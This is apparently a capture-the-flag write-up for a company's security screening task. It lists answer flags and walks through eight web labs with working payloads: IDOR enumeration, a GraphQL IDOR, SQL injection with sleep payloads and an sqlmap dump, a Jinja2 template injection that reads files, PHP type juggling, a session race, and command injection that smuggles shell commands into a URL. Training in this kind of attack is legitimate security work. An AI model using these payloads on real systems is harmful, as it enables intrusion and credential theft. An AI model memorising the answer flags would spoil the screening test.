# Fenrir Security Private Limited

## TECHNICAL SCREENING TASK

#### FLAGS
##### 2   :flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}
##### 7   :flag{35e71c8c-88aa-427c-affe-d1dbd5cdbda9}
##### 40  :flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}
##### 53  :flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}
##### 55  :flag{5a33e31a-7627-4044-964f-744917d6ca5f}
##### 88  :flag{3d582313-fe30-457d-ac42-193b066d56c0}
##### 94  :flag{4ddcff40-05d4-4fa6-aaf0-f2d29e219b4d}
##### 101 :flag{6317d2c3-778a-44c3-b198-9aeaf3e98d2c}

---------------------------------------------------------------------------------------------------------

##### LAB 2:
IDOR

Challenge Walkthrough:
1. Access the site using any proxy tools like (burp,caido)
2. check the response of the home page discloses  `<!-- TODO: Delete the testing account (test:test). --> `
3. Login in to the account using the disclosed credentials.
4. Check the orders page where user can archive the orders.
5. With the help Intruder increase the orderid `/order/300§123§/archive` and automate it until u found the ticker named flag on order id  `Order ID: 300198`.
6. Go to the  `/orders_archive` and find the ticker named FLAG ,Click on Receipt to read the Flag.
`flag{8b9df79e-91eb-4f4e-8449-5e1d207a0d83}`

##### LAB 7:
Hardcoded Credentials & Weak Passwords ,Graph IDOR

1.Check the source code of the app where 2 users credentials are hard coded in the code              .
2.login with `user:user` account and check the response where graphql post request is disclosed.

`  query:
         mutation {
                        addPrescription(userId: ${userID}, prescriptionDetails: "${prescriptionDetails}") {
                            prescription {
                                id
                                userId
                                prescriptionDetails
                                flag
                            }
                        `
                   
 3.  make a query based on the above response
    `query {
                getPrescriptions(userId: 1) {
                    id
                    prescriptionDetails
                    flag
                }
            }
        `        
5. The above query discloses the prescriptions for the other user
6. At the prescription id at `43` we can find our Flag.
   
`{"id":43,"prescriptionDetails":"Prescription 43 for Admin","flag":"flag{35e71c8c-88aa-427c-affe-d1dbd5cdbda9}"`


##### LAB 40:
 SQLI 
1.Access the application and crawl the page ,Check the category function and access any category.
2.use single `'` symbol at the end of selected category `http://192.168.29.43/?category=Cooking'`
3.observe with the error cased by the sql server on our syntax `Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Cooking''' at line 1`
4.Check with sleep payload `/?category=Cooking%27%20AND%20SLEEP(50)--%20-`  the injection triggered successfully at backend sql server causing the time delay.
5. using Sqlmap at the injection parameter `sqlmap -u "http://192.168.29.43/?category=Cooking" --dump -T admins `.Gives us the admin user credentials at admins table.
`+----+-------------------------+----------+
| id | password                | username |
+----+-------------------------+----------+
| 1  | ONEverySecurePassword_! | admin    |
`
6.Login in with the credentials and get the flag on the home screen.
`flag{aee858fc-7ed4-4e52-9a7b-dc67ce9c7d33}`

##### LAB 53

Summary
SSTI

1.Access the application and check the response where `You can call this URL with a username query string parameter, anything you put there will be shown on the page.`
2.calling the username parameter it just reflects it whatever we call on username parameter.
3.Checking with the ssti payload `/?username={{7*7}}` gets reflected as `Welcome 49!`.
4.After checking the Jinja2 paylaods and construction the code to read our flag at `/?username={{+self.__init__.__globals__.__builtins__.open('/app/flag.txt').read()+}}`
`Welcome flag{e7f1e7e4-3abe-4643-9d9e-e64a767bca8b}!`

##### LAB 55
Type Juggling Bypass
1.By reading the source code at line 71 `&& strcmp ($_GET['password'], $password) == 0)` ,where as the function compares 2 strings.
2.so we can bypass the logic by using only username and empty password.
3.check with any user , the response discloses the admin user.
4. trying with the admin user and null password gets granted  and discloses the flag
`GET /index.php?username=admin&password=`
`Congratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}`

##### LAB 88

Session Authentication bypass

1. Checking the source code the application is vulnerable to session comparison attack at verify_session logic.
2. so we can access the page and check for initial creds in the response `test:test`.
3. login with the creds and access the admin_panel gets an error not an admin.
4. with the parameter debug /admin_panel?debug=session gets the server side content on the response
 `<!--Server-Side Session Content:    
{'_permanent': True, 'username': 'test', 'password_hash': '0cda9742a5f7afc070294c47d5058dc1ee5d5e88141d2829cbbe0b7d0a9924ea', 'session_id': 'zNQYGyH2SbgjBJq8TPANwkfeRDOyU6yJV4NoMc28VvE', 'user_id': 1}`
5.After logging attempt with the admin user  and checking with the Server-Side Session Content debug=session
`<!--Server-Side Session Content:    
{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;admin&#39;, &#39;password_hash&#39;: &#39;9b0ec379eb327b11e24c458609b12c5be39214f4b216b03d7c14ceccd8cb7f70&#39;, &#39;session_id&#39;: &#39;zNQYGyH2SbgjBJq8TPANwkfeRDOyU6yJV4NoMc28VvE&#39;, &#39;user_id&#39;: 1}-->`
6. The session is appending the same hash for both the users, But unfortunatly we are unable to access the admin account as the application redirects to login ,without right credentials.
7. now we need to call 3 endpoints continuously with more  resource  pool .
8. 2 login request for both admin:test, test:test and by calling GET /admin_panel?debug=session and add config in the intruder to match the string flag and stop the attack.
9. we can fetch the flag at some time on the endpoint /admin_panel
10. `flag{3d582313-fe30-457d-ac42-193b066d56c0}`


##### LAB 94
OS COMMAND INJECTION

1.Check the source code at check url function
`check_url(url): # Vulnerable to OS Command Injection`
2.after trying many paylaods and bypasses tried to close the syntax and read the flag.
`http://127.0.0.1:5003/"; echo START && cat flag.txt && echo END ; "`
3. after executing the payload we can read teh flag
`flag{4ddcff40-05d4-4fa6-aaf0-f2d29e219b4d}`


##### LAB 101

Padding attack

1.Access the site and check the page that gives us functionality to the user for creating new account, but we're unable to read the captcha fully.
2.checking the source code we had a decrypt fucntion and having a hardcoded key.
3.After extracting the captcha from the cookie and decrypting it with the help of hardcoded key. 

4.we can able to read the captcha and create a user to get a flag.
`flag{6317d2c3-778a-44c3-b198-9aeaf3e98d2c}`
